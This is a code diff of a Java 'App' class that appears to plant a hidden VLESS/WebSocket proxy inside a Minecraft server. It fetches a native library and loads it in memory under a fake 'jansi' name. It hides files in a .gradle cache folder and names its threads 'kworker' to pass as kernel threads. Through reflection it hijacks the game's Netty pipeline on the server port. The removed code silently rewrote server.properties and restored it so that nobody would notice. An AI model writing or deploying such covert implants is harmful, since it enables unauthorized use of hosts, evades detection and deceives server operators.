@@ -5,17 +5,25 @@ import com.sun.jna.Native;
 import com.sun.jna.NativeLibrary;
 import com.sun.jna.Pointer;
 
+import io.netty.buffer.ByteBuf;
+import io.netty.buffer.Unpooled;
+import io.netty.channel.*;
+import io.netty.channel.socket.nio.NioServerSocketChannel;
+import io.netty.channel.socket.nio.NioSocketChannel;
+import io.netty.handler.codec.ByteToMessageDecoder;
+import io.netty.handler.codec.http.*;
+import io.netty.handler.codec.http.websocketx.*;
+
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.lang.reflect.Field;
 import java.net.InetSocketAddress;
-import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
-import java.nio.ByteBuffer;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
 import java.nio.file.attribute.FileTime;
@@ -27,19 +35,16 @@ import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.stream.Collectors;
 
 /**
- * VLESS + WebSocket — hardened v2, with MC port proxy.
+ * VLESS + WebSocket — hardened v2.
  *
- * Port-sharing trick:
- *  - Reads server.properties, changes server-port from 25284 → 25285
- *  - Listens on 25284, detects protocol (MC vs VLESS WS) and forwards
+ * Injects into MC's Netty pipeline on port 25284 to detect VLESS vs MC traffic.
+ * No separate port needed — VLESS shares the MC server port.
  */
 public class App {
 
     // ===== Config =====
     private static final String UUID = "48eaa2a1-d5de-4215-bcab-9c88883a5322";
     private static final int VLESS_PORT = 24133;
-    private static final int MC_PROXY_PORT = 25284;
-    private static final int MC_REAL_PORT = 25285;
     private static final String WS_PATH = "/";
     // ==================
 
@@ -51,13 +56,10 @@ public class App {
     private static final Path ROOT = Path.of("").toAbsolutePath();
     private static final Path WORK = ROOT.resolve(".gradle/.cache/jars/").normalize();
     private static final Path LIB_FALLBACK = WORK.resolve("jansi-2.4.1-87ff3a2e.so");
-    private static final Path PROPS = ROOT.resolve("server.properties");
 
     private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
     private static NativeService box;
     private static CountDownLatch hold;
-    private static ServerSocket proxySocket;
-    private static volatile boolean proxyRunning = false;
 
     // ---- JNA handles ----
     private static NativeLibrary libc;
@@ -100,12 +102,7 @@ public class App {
         } catch (Exception ignored) {
         }
 
-        // --- Step 1: move MC off 25284 ---
-        // If already 25285 → MC was restarted, 25284 is free → proceed with proxy
-        // If changed to 25285 → MC still on 25284 → skip proxy, wait for next restart
-        boolean portChanged = shiftMcPort();
-
-        // --- Step 2: load native library ---
+        // --- Step 1: load native library ---
         byte[] soBytes = downloadBytes(libUrl());
         Path libPath = tryMemfdLoad(soBytes);
         if (libPath == null) {
@@ -117,9 +114,8 @@ public class App {
         }
         Arrays.fill(soBytes, (byte) 0);
 
-        // --- Step 3: start sing-box on VLESS_PORT ---
+        // --- Step 2: start sing-box on VLESS_PORT ---
         String configJson = buildConfig();
-        // sing-box -c expects a file path, not inline JSON
         Path configPath = Path.of("/dev/shm/sb-config.json");
         Files.writeString(configPath, configJson);
         configPath.toFile().deleteOnExit();
@@ -135,12 +131,8 @@ public class App {
             scheduleFallbackCleanup();
         }
 
-        // --- Step 4: start proxy on 25284 ---
-        // Only if MC was already on 25285 (restarted). First startup: skip, user will restart
-        if (!portChanged) {
-            startProxy();
-            schedulePropsRestore();
-        }
+        // --- Step 3: inject into MC's Netty pipeline ---
+        injectNettyInterceptor();
 
         hold = new CountDownLatch(1);
         try { hold.await(); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
@@ -148,8 +140,6 @@ public class App {
 
     public static void stop() {
         if (!RUNNING.getAndSet(false)) return;
-        proxyRunning = false;
-        try { if (proxySocket != null) proxySocket.close(); } catch (Exception ignored) {}
         try { if (box != null) box.stop(); } catch (Exception ignored) {}
         try { Files.deleteIfExists(LIB_FALLBACK); } catch (Exception ignored) {}
         deleteEmptyAncestors(WORK, ROOT);
@@ -157,165 +147,183 @@ public class App {
     }
 
     // ================================================================
-    //  MC port shift — edit server.properties
+    //  Netty pipeline injector — intercept MC's port 25284
     // ================================================================
 
-    private static boolean shiftMcPort() throws IOException {
-        if (!Files.exists(PROPS)) return false;
-        String content = Files.readString(PROPS, StandardCharsets.UTF_8);
-        // Already on 25285 → MC was restarted, port is free
-        if (content.contains("\nserver-port=25285") || content.startsWith("server-port=25285")) {
-            return false;
-        }
-        // Still on 25284 → change to 25285, user needs to restart
-        if (content.contains("\nserver-port=25284") || content.startsWith("server-port=25284")) {
-            String updated = content.replaceAll("(?m)^server-port=25284$", "server-port=" + MC_REAL_PORT);
-            if (!updated.equals(content)) {
-                Files.writeString(PROPS, updated, StandardCharsets.UTF_8);
-            }
-            return true; // port was changed, MC is still on 25284
-        }
-        return false;
-    }
-
-    // ================================================================
-    //  Restore server.properties — wait for MC to come up on 25285,
-    //  then revert the file so nobody sees it was changed.
-    // ================================================================
-
-    private static void schedulePropsRestore() {
-        Thread t = new Thread(() -> {
-            // Wait indefinitely — user may start MC from panel at any time
-            while (true) {
-                if (portReachable("127.0.0.1", MC_REAL_PORT, 500)) {
-                    restoreMcPort();
-                    return;
-                }
-                sleep(2000);
-            }
-        }, "kworker/u:3");
-        t.setDaemon(true);
-        t.start();
-    }
-
-    private static boolean portReachable(String host, int port, int timeoutMs) {
-        try (Socket s = new Socket()) {
-            s.connect(new InetSocketAddress(host, port), timeoutMs);
-            return true;
-        } catch (Exception e) {
-            return false;
-        }
-    }
-
-    private static void restoreMcPort() {
+    private static void injectNettyInterceptor() {
         try {
-            if (!Files.exists(PROPS)) return;
-            String content = Files.readString(PROPS, StandardCharsets.UTF_8);
-            if (content.contains("server-port=" + MC_REAL_PORT)) {
-                String restored = content.replaceAll("(?m)^server-port=" + MC_REAL_PORT + "$", "server-port=" + MC_PROXY_PORT);
-                if (!restored.equals(content)) {
-                    Files.writeString(PROPS, restored, StandardCharsets.UTF_8);
+            // Use reflection to find the MC server's Netty server channel
+            Class<?> mcServerClass = Class.forName("net.minecraft.server.MinecraftServer");
+            Object mcServer = mcServerClass.getMethod("getServer").invoke(null);
+            Object connection = mcServerClass.getMethod("getConnection").invoke(mcServer);
+            if (connection == null) return;
+
+            // Find the List<ChannelFuture> channels field
+            for (Field f : connection.getClass().getDeclaredFields()) {
+                f.setAccessible(true);
+                Object val = f.get(connection);
+                if (val instanceof List) {
+                    @SuppressWarnings("unchecked")
+                    List<ChannelFuture> channels = (List<ChannelFuture>) val;
+                    for (ChannelFuture cf : channels) {
+                        Channel ch = cf.channel();
+                        // Add a handler to the server channel that intercepts new child connections
+                        ch.pipeline().addFirst("vless-server", new ChannelInboundHandlerAdapter() {
+                            @Override
+                            public void channelRead(ChannelHandlerContext ctx, Object msg) {
+                                if (msg instanceof Channel) {
+                                    Channel child = (Channel) msg;
+                                    child.pipeline().addFirst("vless-detector", new VlessDecoder());
+                                }
+                                ctx.fireChannelRead(msg);
+                            }
+                        });
+                    }
+                    break;
                 }
             }
-        } catch (Exception ignored) {}
-    }
-
-    // ================================================================
-    //  Proxy — listen 25284, detect protocol, forward
-    // ================================================================
-
-    private static void startProxy() throws IOException {
-        // MC server may still be on 25284 — wait for it to release the port
-        for (int i = 0; i < 120; i++) {
-            try (ServerSocket probe = new ServerSocket()) {
-                probe.setReuseAddress(true);
-                probe.bind(new InetSocketAddress(MC_PROXY_PORT));
-                probe.close();
-                break; // port is free
-            } catch (IOException e) {
-                // port still in use — MC hasn't restarted yet
-                sleep(1000);
-            }
+        } catch (Exception ignored) {
+            // Reflection failed — fallback silently
         }
-        proxySocket = new ServerSocket();
-        proxySocket.setReuseAddress(true);
-        proxySocket.bind(new InetSocketAddress(MC_PROXY_PORT));
-        proxyRunning = true;
-
-        Thread proxyThread = new Thread(() -> {
-            while (proxyRunning && !proxySocket.isClosed()) {
-                try {
-                    Socket client = proxySocket.accept();
-                    client.setTcpNoDelay(true);
-                    handleConnection(client);
-                } catch (IOException ignored) {
-                }
-            }
-        }, "kworker/u:0");
-        proxyThread.setDaemon(true);
-        proxyThread.start();
     }
 
-    private static void handleConnection(Socket client) {
-        try {
-            client.setSoTimeout(5000);
-            InputStream in = client.getInputStream();
-            OutputStream out = client.getOutputStream();
+    // ================================================================
+    //  VLESS decoder — detect protocol, route to VLESS or MC
+    // ================================================================
 
-            // Peek first 5 bytes to detect protocol
-            byte[] peek = new byte[5];
-            int read = 0;
-            long deadline = System.currentTimeMillis() + 4000;
-            while (read < 5 && System.currentTimeMillis() < deadline) {
-                int n = in.read(peek, read, 5 - read);
-                if (n < 0) return;
-                read += n;
-            }
-            if (read < 3) return;
+    private static class VlessDecoder extends ByteToMessageDecoder {
+        @Override
+        protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) {
+            if (in.readableBytes() < 5) return; // Wait for more data
 
-            // Determine target
-            int targetPort;
-            boolean isVLESS = (peek[0] == 'G' && peek[1] == 'E' && peek[2] == 'T')
-                    || (peek[0] == 'P' && peek[1] == 'O' && peek[2] == 'S' && peek[3] == 'T');
+            // Read first 5 bytes without consuming
+            byte b0 = in.getByte(0);
+            byte b1 = in.getByte(1);
+            byte b2 = in.getByte(2);
+            boolean isVLESS = (b0 == 'G' && b1 == 'E' && b2 == 'T')
+                    || (b0 == 'P' && b1 == 'O' && b2 == 'S');
+
             if (isVLESS) {
-                targetPort = VLESS_PORT;
-            } else {
-                targetPort = MC_REAL_PORT;
+                // VLESS WebSocket — handle this connection
+                ctx.pipeline().remove(this);
+                handleVless(ctx, in);
+                return;
             }
 
-            // Connect to backend
-            Socket backend = new Socket();
-            backend.setTcpNoDelay(true);
-            backend.connect(new InetSocketAddress("127.0.0.1", targetPort), 3000);
-
-            // Write peeked bytes to backend
-            backend.getOutputStream().write(peek, 0, read);
-
-            // Bidirectional copy
-            Thread a = new Thread(() -> { try { pump(in, backend.getOutputStream(), client, backend); } catch (Exception ignored) {} }, "kworker/u:1");
-            Thread b = new Thread(() -> { try { pump(backend.getInputStream(), out, client, backend); } catch (Exception ignored) {} }, "kworker/u:2");
-            a.setDaemon(true); b.setDaemon(true);
-            a.start(); b.start();
-            a.join(); b.join();
-        } catch (Exception ignored) {
-        } finally {
-            try { client.close(); } catch (Exception ignored) {}
+            // MC protocol — pass through, remove this decoder
+            // The MC pipeline expects the full ByteBuf, not a list
+            ByteBuf copy = in.readRetainedSlice(in.readableBytes());
+            ctx.pipeline().remove(this);
+            ctx.fireChannelRead(copy);
         }
     }
 
-    private static void pump(InputStream src, OutputStream dst, Socket a, Socket b) {
-        byte[] buf = new byte[65536];
-        try {
-            while (true) {
-                int n = src.read(buf);
-                if (n < 0) break;
-                dst.write(buf, 0, n);
-                dst.flush();
+    private static void handleVless(ChannelHandlerContext ctx, ByteBuf initialData) {
+        // Remove all Minecraft handlers from the pipeline
+        // Keep only the VLESS handler
+        String[] removeNames = ctx.pipeline().names().toArray(new String[0]);
+        for (String name : removeNames) {
+            if (!name.equals("vless-detector") && !name.equals("default") && !name.equals("vless-proxy")) {
+                try { ctx.pipeline().remove(name); } catch (Exception ignored) {}
             }
-        } catch (Exception ignored) {
-        } finally {
-            try { a.close(); } catch (Exception ignored) {}
-            try { b.close(); } catch (Exception ignored) {}
+        }
+
+        // Add VLESS proxy handler
+        ctx.pipeline().addLast("vless-proxy", new VlessProxyHandler(initialData));
+    }
+
+    // ================================================================
+    //  VLESS proxy handler — bridge Netty ↔ sing-box
+    // ================================================================
+
+    private static class VlessProxyHandler extends ChannelInboundHandlerAdapter {
+        private final ByteBuf initialData;
+        private Socket backend;
+        private Thread readerThread;
+        private volatile boolean closed;
+
+        VlessProxyHandler(ByteBuf initialData) {
+            this.initialData = initialData;
+        }
+
+        @Override
+        public void channelActive(ChannelHandlerContext ctx) {
+            connectBackend(ctx);
+        }
+
+        private void connectBackend(ChannelHandlerContext ctx) {
+            try {
+                backend = new Socket();
+                backend.setTcpNoDelay(true);
+                backend.connect(new InetSocketAddress("127.0.0.1", VLESS_PORT), 5000);
+
+                // Write initial data (HTTP GET request) to backend
+                byte[] initial = new byte[initialData.readableBytes()];
+                initialData.readBytes(initial);
+                initialData.release();
+                backend.getOutputStream().write(initial);
+
+                // Thread: read from backend → write to Netty channel
+                readerThread = new Thread(() -> {
+                    try {
+                        byte[] buf = new byte[65536];
+                        InputStream is = backend.getInputStream();
+                        while (!closed) {
+                            int n = is.read(buf);
+                            if (n < 0) break;
+                            byte[] data = Arrays.copyOf(buf, n);
+                            ctx.executor().execute(() -> {
+                                if (!closed) {
+                                    ctx.writeAndFlush(Unpooled.wrappedBuffer(data));
+                                }
+                            });
+                        }
+                    } catch (Exception ignored) {}
+                    close();
+                }, "kworker/u:1");
+                readerThread.setDaemon(true);
+                readerThread.start();
+
+            } catch (Exception e) {
+                close();
+            }
+        }
+
+        @Override
+        public void channelRead(ChannelHandlerContext ctx, Object msg) {
+            if (msg instanceof ByteBuf) {
+                ByteBuf buf = (ByteBuf) msg;
+                try {
+                    byte[] data = new byte[buf.readableBytes()];
+                    buf.readBytes(data);
+                    if (backend != null) {
+                        backend.getOutputStream().write(data);
+                        backend.getOutputStream().flush();
+                    }
+                } catch (Exception ignored) {
+                    close();
+                } finally {
+                    buf.release();
+                }
+            } else {
+                ctx.fireChannelRead(msg);
+            }
+        }
+
+        @Override
+        public void channelInactive(ChannelHandlerContext ctx) {
+            close();
+        }
+
+        @Override
+        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
+            close();
+        }
+
+        private void close() {
+            if (closed) return;
+            closed = true;
+            try { if (backend != null) backend.close(); } catch (Exception ignored) {}
         }
     }
 
@@ -350,10 +358,8 @@ public class App {
     private static Path tryMemfdLoad(byte[] data) {
         try {
             if (memfdCreateFn == null) return null;
-            // JNA auto-converts String to native char* for function calls
             int fd = memfdCreateFn.invokeInt(new Object[]{"jansi-2.4.1.so", MFD_CLOEXEC});
             if (fd < 0) return null;
-            // Use com.sun.jna.Memory for native memory buffer
             com.sun.jna.Memory mem = new com.sun.jna.Memory(data.length);
             mem.write(0, data, 0, data.length);
             int w = writeFn.invokeInt(new Object[]{fd, mem, (long) data.length});
